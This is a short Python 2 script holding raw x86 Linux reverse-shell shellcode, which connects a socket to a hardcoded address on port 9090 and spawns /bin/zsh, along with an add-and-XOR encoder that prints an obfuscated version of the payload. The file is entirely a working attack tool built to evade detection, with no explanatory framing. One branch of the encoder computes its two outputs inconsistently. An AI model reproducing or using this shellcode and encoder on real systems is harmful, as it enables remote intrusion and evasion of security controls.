#!/usr/bin/python

shellcode = ("\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x96\xb0\x66" \
	    "\x83\xc3\x02\x68\x7f\xff\xff\xef\x66\x68\x23\x82\x66\x6a\x02\x89\xe1\x6a\x10\x51" \
	    "\x56\x89\xe1\xcd\x80\x96\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50" \
	    "\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

enc = ""
enc2 = ""

for x in bytearray(shellcode):

	# if greater than 128 start from beginning
	if x > 128:
	        enc += '\\x'
        	enc += '%02x' %((127 -(256 - x)) ^ 95)
        	enc2 += '0x'
        	enc2 += '%02x,' %((127 -(256 - x) ^ 95))
	else:
        	enc += '\\x'
        	enc += '%02x'%((x+127) ^ 95)
        	enc2 += '0x'
        	enc2 += '%02x,' %((x+127) ^ 95)

enc2 = enc2[:-1]

print "Encoded shellcode: \n"
print enc
print "\n"
print enc2

print 'Lenght: %d' % len(bytearray(shellcode))
